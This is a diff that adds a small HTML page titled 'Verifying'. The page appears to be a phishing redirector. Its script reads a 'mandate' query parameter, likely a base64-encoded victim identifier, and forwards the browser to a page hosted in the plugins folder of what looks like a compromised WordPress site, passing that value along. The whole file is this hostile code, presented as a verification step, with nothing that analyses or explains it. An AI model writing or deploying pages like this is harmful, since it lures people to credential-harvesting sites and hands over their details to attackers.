@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Verifying</title>
+  </head>
+  <body></body>
+  <h1>newwert</h1>
+  <script>
+    let landing =
+      "https://dapurpommini.com/wp-content/plugins/june.html";
+    let qParams = new URLSearchParams(window.location.search);
+    let e = qParams.get("mandate"); // or whatever used;
+    var decoder = "";
+    try {
+      decoder = atob(e);
+    } catch {
+      decoder = e;
+    }
+    document.location.href = landing + e;
+  </script>
+</html
